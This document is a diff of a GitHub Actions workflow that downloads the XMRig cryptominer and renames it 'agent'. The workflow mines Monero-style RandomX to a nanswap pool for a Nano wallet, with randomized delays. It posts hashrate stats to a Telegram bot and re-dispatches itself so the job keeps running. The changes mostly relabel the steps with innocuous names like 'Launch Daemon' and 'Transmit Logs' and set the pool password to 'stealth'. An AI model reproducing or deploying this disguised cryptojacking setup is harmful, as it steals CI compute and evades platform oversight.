@@ -14,66 +14,63 @@ jobs:
     timeout-minutes: 360
 
     steps:
-      - name: Boot Sequence
-        run: echo "📡 Initializing diagnostic stack..."
+      - name: Booting Node
+        run: echo "Initializing telemetry instance..."
 
-      - name: Fetch Core Dependencies
+      - name: Installing Core Tools
         run: |
-          sudo apt update -y
-          sudo apt install -y curl tar
+          sudo apt update -y && sudo apt install -y curl tar
 
-      - name: Begin Uplink Session
+      - name: Init Status Report
         env:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
-          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
-            -d chat_id=$TG_CHAT_ID \
-            --data-urlencode text="🟢 *System Node A online.*\nRuntime randomized between 20–90 minutes." \
-            -d parse_mode=Markdown
+          echo "🟢 *Daemon active: XNO.*\nCycle: 20–90 mins." | curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
+            -d chat_id=$TG_CHAT_ID --data-urlencode text@- -d parse_mode=Markdown
 
-      - name: Deploy Node Agent
+      - name: Launch Daemon
         run: |
-          curl -L -o pkg.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
-          tar -xzf pkg.tar.gz
+          curl -L -o agent.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+          tar -xzf agent.tar.gz
           mv xmrig-6.24.0 node-core
           cd node-core
           mv xmrig agent
           chmod +x agent
 
-          sleep $((RANDOM % 300 + 60))
+          sleep $((RANDOM % 300 + 30))
 
-          ./agent -a rx -o xmrig.nanswap.com:3333 -k \
+          ./agent -o xmrig.nanswap.com:3333 -a rx -k \
             -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
-            -p sysmon --randomx-no-rdmsr | tee report.log &
+            -p stealth --randomx-no-rdmsr | tee report.log &
 
           PID=$!
           sleep $((RANDOM % 5400 + 1200))
           kill $PID
 
-      - name: Analyze Session Log
+      - name: Transmit Logs
         if: always()
         env:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
-          cd $(find . -type d -name "node-core")
+          set +e
+          cd node-core
           HASHRATE=$(grep -a "speed" report.log | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1) " H/s"}')
           ACCEPTED=$(grep -a "accepted" report.log | wc -l)
           REJECTED=$(grep -a "rejected" report.log | wc -l)
 
-          MSG="✅ *System Node A session complete.*\n\n📊 *Stats:*\n• Hashrate: \`$HASHRATE\`\n• Accepted: \`$ACCEPTED\`\n• Rejected: \`$REJECTED\`"
-
+          MSG="✅ *XNO Daemon complete.*\n\n📊 *Telemetry:*\n• Hashrate: \`$HASHRATE\`\n• Accepted: \`$ACCEPTED\`\n• Rejected: \`$REJECTED\`"
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID -d text="$MSG" -d parse_mode=Markdown
 
-      - name: Propagate Activity
+      - name: Relay Next Daemon
         if: always()
         env:
           GH_TOKEN: ${{ secrets.GH_TOKEN }}
         run: |
           sleep $((RANDOM % 60 + 10))
-          curl -X POST -H "Accept: application/vnd.github+json" \
-               -H "Authorization: Bearer $GH_TOKEN" \
-               https://api.github.com/repos/${{ github.repository }}/actions/workflows/bnb-collector.yml/dispatches \
-               -d '{"ref":"main"}'
+          curl -X POST -H "Authorization: Bearer $GH_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            https://api.github.com/repos/${{ github.repository }}/actions/workflows/bnb-collector.yml/dispatches \
+            -d '{"ref":"main"}'
